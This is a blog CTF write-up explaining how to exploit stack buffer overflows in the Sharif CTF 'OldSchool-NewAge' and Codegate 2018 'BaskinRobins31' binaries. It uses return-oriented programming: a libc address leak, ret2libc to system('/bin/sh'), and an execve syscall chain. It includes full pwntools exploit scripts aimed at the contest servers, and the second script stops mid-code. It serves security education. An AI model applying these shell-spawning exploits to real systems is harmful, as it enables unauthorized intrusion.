<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>[Write-Up] Codegate 2018 preliminary CTF / SharifCTF 8</title>
	
	<meta name="description" content="Write-Up on the challenges "BaskinRobins31" and "OldSchool-NewAge" of the Codegate preliminary and Sharif CTF. This Write-Up will show you two ways to solve a Return Oriented Programming, with and without having access to the LibC.">
	
	<meta name="author" content="Quentin Meffre">

	<!-- Enable responsive viewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- Le styles -->
	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
	<link href="/assets/css/style.css" rel="stylesheet">
	<link href="/assets/css/syntax.css" rel="stylesheet">

	<!-- Le fav and touch icons -->
	<!-- Update these with your own images
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
	-->

	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
</head>

<body>
	<nav class="navbar navbar-default visible-xs" role="navigation">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			
			<a type="button" class="navbar-toggle nav-link" href="http://github.com/meffre-q">
				<i class="fa fa-github"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/0xdagger">
				<i class="fa fa-twitter"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="mailto:quentin.meffre@epitech.eu">
				<i class="fa fa-envelope"></i>
			</a>
			
			<a class="navbar-brand" href="/">
				<img src="//www.gravatar.com/avatar/?s=35" class="img-circle" />
				quentin meffre
			</a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			<ul class="nav navbar-nav">
				<li class="active"><a href="/">Home</a></li>
				<li><a href="/categories.html">Categories</a></li>
				<li><a href="/tags.html">Tags</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>

	<!-- nav-menu-dropdown -->
	<div class="btn-group hidden-xs" id="nav-menu">
		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
			<i class="fa fa-bars"></i>
		</button>
		<ul class="dropdown-menu" role="menu">
			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
			<li class="divider"></li>
			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
		</ul>
	</div>

	<div class="col-sm-3 sidebar hidden-xs" style="">
		<!-- sidebar.html -->
<header class="sidebar-header" role="banner">
	<a href="/">
		<img src="/assets/media/myavatar-1-.png" class="img-circle" />
	</a>
	<h3 class="title">
        <a href="/">quentin meffre</a>
    </h3>
</header>


<div id="bio" class="text-center">
	Computer science student, passionate about Cyber Security.
</div>


<div id="contact-list" class="text-center">
	<ul class="list-unstyled list-inline">
		
		<li>
			<a class="btn btn-default btn-sm" href="https://github.com/meffre-q">
				<i class="fa fa-github-alt fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://twitter.com/0xdagger">
				<i class="fa fa-twitter fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="mailto:quentin.meffre@epitech.eu">
				<i class="fa fa-envelope fa-lg"></i>
			</a>
		</li>
		
	</ul>
	<ul id="contact-list-secondary" class="list-unstyled list-inline">
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/quentin-meffre">
				<i class="fa fa-linkedin fa-lg"></i>
			</a>
		</li>
		
		<li>
			<a class="btn btn-default btn-sm" href="/feed.xml">
				<i class="fa fa-rss fa-lg"></i>
			</a>
		</li>
	</ul>
</div>
<!-- sidebar.html end -->

	</div>

	<div class="col-sm-9 col-sm-offset-3">
		<div class="page-header">
  <h1>[Write-Up] Codegate 2018 preliminary CTF / SharifCTF 8 </h1>
</div>
	
<article>

	<div class="col-sm-10">
	 <span class="post-date">
	   
	   February 
	   4th,
	   
	   2018
	 </span>
	  <div class="article_body">
	  <h1 id="surroundings">Surroundings</h1>
<p>This week-end took place the <a href="https://quals.codegate.kr">Codegate preliminary</a> and the <a href="http://ctf.sharif.edu">Sharif</a> CTF. This Write-Up is going to show you how to solve the first pwnable challenges of both CTF. Both challenges must be solved using the Return Oriented Programming technique but for the Codegate one, the binary is provided without having access to the LibC compare to the Sharif one. I am going to show you two techniques to solve both challenges.</p>

<p>This Write-Up is divided into two parts:</p>
<ol>
  <li><a href="/write-up/2018/02/04/write_up_codegate_sharif.html#oldschool-newage">OldSchool-NewAge</a>, Sharif CTF</li>
  <li><a href="/write-up/2018/02/04/write_up_codegate_sharif.html#baskinrobins31">BaskinRobins31</a>, Codegate preliminary CTF</li>
</ol>

<h1 id="oldschool-newage">OldSchool-NewAge</h1>
<p>For this challenge we have a binary which is provided with the LibC used on the remote server. Let first begin by take a look to the given binary:</p>

<p><img src="/assets/media/sharif_check_binary.png" alt="Check_binary" /></p>

<p>From this, we can get the following informations:</p>
<ul>
  <li>The only enabled protection is “No eXecutable”.</li>
  <li>The binary is dynamically linked.</li>
  <li>The binary is compiled for an x86 architecture.</li>
</ul>

<p>Let’s try to run it to have a better idea of the binary behaviour:</p>

<p><img src="/assets/media/sharif_segv_binary.png" alt="Start binary" /></p>

<p>The binary ask for something on input and print some text on its output. Its easy to get a Segmentation fault, we just have to send a huge string on input.</p>

<p>Let’s disassemble it with IDA to know why we got this SegV:</p>

<p><img src="/assets/media/sharif_copy_it.png" alt="Copy_it" /></p>

<p>The binary first begin by reading 200 bytes on its input using fgets() and then it copies the bytes read into a buffer. On the last screenshot you can see the copy_it() function which copy the bytes read into the destination buffer using strcpy(). But the destination buffer only has a size of 18 bytes so we can easily overwrite the saved RIP address.</p>

<p>As the binary is compiled in 32 bits, I could brute-force the base address of the LibC to call system() but I choose another method which used the Return Oriented Programming method.</p>

<p>The method is composed of 3 parts:</p>
<ul>
  <li>We are going to begin by leaking an address to defeat the ASLR</li>
  <li>Then we are going to return to main()</li>
  <li>Then we are going to do a classic “Ret to LibC”</li>
</ul>

<p>To leak one LibC address, we are going to use the puts() function which is in the “.plt” section. We will give it one GOT entry as first argument, for example the GOT address of strcpy(). To edit puts() first argument we will use one gadget which pop one value into RDI register. After did that we are going to return to main() using it address.</p>

<p>The whole payload for the two first part look like this:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+------------+------------+------------+------------+
|            |            |            |            |
|  pop rdi   |  GOT_ADDR  |  puts_plt  |   main<span class="o">()</span>   |
|            |            |            |            |
+------------+------------+------------+------------+
</code></pre></div></div>

<p>Now that we leak our address, it is easy to calculate the LibC base address, the system() address and the “/bin/sh” address.</p>

<p>The last step is to overwrite the saved RIP with our last gadget “pop rdi” to pop the address of “/bin/sh” and then call system().
The ropchain look like this:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+------------+------------+------------+
|            |            |            |
|  pop rdi   |  /bin/sh   |  system<span class="o">()</span>  |
|            |            |            |
+------------+------------+------------+
</code></pre></div></div>

<p>The whole exploit look like this:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python2.7</span>
<span class="c"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">"i386"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span>


<span class="k">class</span> <span class="nc">Pwn</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./vuln4"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="k">def</span> <span class="nf">leak_addr</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">([</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="p">])</span>
        <span class="n">main</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
        <span class="n">puts_plt</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
        <span class="n">puts_got</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'strcpy'</span><span class="p">]</span>

        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">21</span><span class="p">)</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">))</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span>
        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"yourself</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>
        <span class="k">print</span> <span class="s">"[x] Leak "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="s">" bytes at "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="s">" : "</span> <span class="o">+</span> <span class="s">":"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">"{:02x}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">start_binary</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"ctf.sharif.edu"</span><span class="p">,</span> <span class="mi">4801</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"yourself</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">execute_system</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">leak_binsh</span><span class="p">,</span> <span class="n">leak_system</span><span class="p">):</span>
        <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">([</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="p">])</span>

        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">21</span><span class="p">)</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">leak_system</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">leak_system</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">leak_binsh</span><span class="p">))</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">pwn_binary</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">start_binary</span><span class="p">()</span>
        <span class="n">leak_system</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">leak_addr</span><span class="p">()</span> <span class="o">-</span> <span class="mh">0x4c070</span>
        <span class="n">leak_binsh</span> <span class="o">=</span> <span class="n">leak_system</span> <span class="o">+</span> <span class="mh">0x120c6b</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">execute_system</span><span class="p">(</span><span class="n">leak_binsh</span><span class="p">,</span> <span class="n">leak_system</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">pwn</span> <span class="o">=</span> <span class="n">Pwn</span><span class="p">()</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">pwn_binary</span><span class="p">()</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div></div>

<p>Let’s try it:</p>

<p><img src="/assets/media/sharif_2k18_flag.png" alt="Sharif pwn" /></p>

<p>Done.</p>

<p>You can find the binary and the exploit <a href="https://github.com/meffre-q/ctf/tree/master/sharif_2k18/pwn/OldSchool-NewAge">here</a>.</p>

<h1 id="baskinrobins31">BaskinRobins31</h1>
<p>This challenges is very similar to the last one but this time the LibC was not provided with the binary.</p>

<p>Let first begin by checking our binary:</p>

<p><img src="/assets/media/codegate_check_binary.png" alt="Binary check" /></p>

<p>We can get the following informations:</p>
<ul>
  <li>The binary is compiled for an AMD64 architecture.</li>
  <li>The binary is dynamically linked.</li>
  <li>The binary has both “No eXecutable” and “Partial REad onLy RelOcation” protections enabled.</li>
</ul>

<p>Let’s run the binary to take a look at the binary’s behaviour:</p>

<p><img src="/assets/media/codegate_segv.png" alt="Binary test" /></p>

<p>As in the first challenge, the segmentation fault is easy to trigger.</p>

<p>Let’s disassemble it to know what’s happened:</p>

<p><img src="/assets/media/codegate_your_turn.png" alt="Binary disassemble" /></p>

<p>The vulnerability is located in your_turn(). As you can see, this function read 400 bytes on its input and store them into a buffer which has a size of 176 bytes. So it is easy to overwrite the saved RIP on the stack.</p>

<p>As I said earlier, the LibC is not provided for this challenge, so we can’t know the system() offset to call it. As we can read where we want, we can try to guess it but it is not funny. (After looked the other write-up, it is possible to find the LibC version using this <a href="https://libc.blukat.me/">tools</a>) We have access to both read() and write() functions, so we are able to read and write wherever we want. To get a shell we are going to use syscalls to execute execve with the string “/bin/sh” as first argument.</p>

<p>The exploit is divided into 4 parts:</p>
<ul>
  <li>Find one syscall instruction.</li>
  <li>Write “/bin/sh” into memory.</li>
  <li>Set RAX to 0x3b (execve syscall number).</li>
  <li>Execute execve(“/bin/sh”)</li>
</ul>

<p>To begin, we must find one “syscall” instruction to be able to execute “execve”. read() is in the “.got” section so we can easily leak its address.</p>

<p>That is the beginning of read():</p>

<p><img src="/assets/media/codegate_read_func.png" alt="Read function" /></p>

<p>There is a “syscall” instruction at read() + 0xe bytes. We are going to use it for our exploit.</p>

<p>Now we are going to write “/bin/sh” into the memory. This part is very easy as we have write() we will simply write our strings into the “.data” section.</p>

<p>Before execute the syscall, we have to set RAX to 0x3b otherwise we can’t execute execve(). To do it, I used read() which set RAX to the number of read bytes so we just have to send 0x3b to it and then pop the right address into the right register for the argument.</p>

<p>The final ropchain look like this:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+------------+-------------------+------------+------------+------------+------------&gt;
|            |                   |            |            |            |            <span class="o">&gt;</span>
|   offset   |  POP_RDI_RSI_RDX  |     0x0    | .data+0x10 |    0x3b    |   <span class="nb">read</span><span class="o">()</span>   <span class="o">&gt;</span>
|            |                   |            |            |            |            <span class="o">&gt;</span>
+------------+-------------------+------------+------------+------------+------------&gt;

&lt;<span class="nt">-------------------</span>+------------+------------+------------+------------+
&lt;                   |            |            |            |            |
&lt;  POP_RDI_RSI_RDX  |   .data    |    0x0     |     0x0    |   syscall  |
&lt;                   |            |            |            |            |
&lt;<span class="nt">-------------------</span>+------------+------------+------------+------------+
</code></pre></div></div>

<p>The whole exploit look like this:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python2.7</span>
<span class="c"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">"i386"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Pwn</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./BaskinRobins31"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">184</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="k">def</span> <span class="nf">start_binary</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"ch41l3ng3s.codegate.kr"</span><span class="p">,</span> <span class="mi">3131</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"(1-3)</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">read_addr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">([</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="p">])</span>
        <span class="n">main</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
        <span class="n">read_plt</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
        <span class="n">pop_rdi_rsi_rdx</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">"pop rdi"</span><span class="p">,</span> <span class="s">"pop rsi"</span><span class="p">,</span> <span class="s">"pop rdx"</span><span class="p">,</span> <span class="s">"ret"</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>

        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s">"A"</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">offset</span><span class="p">)</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_rsi_rdx</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">read_plt</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">))</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"rules...:( </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">print</span> <span class="s">"[x] Write "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="s">" bytes at "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="s">" : "</span> <span class="o">+</span> <span class="n">data</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"(1-3)</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">write_addr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
        <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">([</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="p">])</span>
        <span class="n">main</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
        <span class="n">write_plt</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
        <span class="n">pop_rdi_rsi_rdx</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">"pop rdi"</span><span class="p">,</span> <span class="s">"pop rsi"</span><span class="p">,</span> <span class="s">"pop rdx"</span><span class="p">,</span> <span class="s">"ret"</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>

        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s">"A"</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">offset</span><span class="p">)</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_rsi_rdx</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">write_plt</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">))</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"rules...:( </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span>
        <span class="k">print</span> <span class="s">"[x] Leak "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="s">" bytes at "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="s">" : "</span> <span class="o">+</span> <span class="s">":"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">"{:02x}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"(1-3)</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">execute_syscall</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">syscall_addr</span><span class="p">):</span>
        <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">([</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="p">])</span>
        <span class="n">pop_rdi_rsi_rdx</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">"pop rdi"</span><span class="p">,</span> <span class="s">"pop rsi"</span><span class="p">,</span> <span class="s">"pop rdx"</span><span class="p">,</span> <span class="s">"ret"</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">data_addr</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">".data"</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
        <span class="n">read_plt</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>

        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s">"A"</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">offset</span><span class="p">)</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_rsi_rdx</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">data_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">))</span>
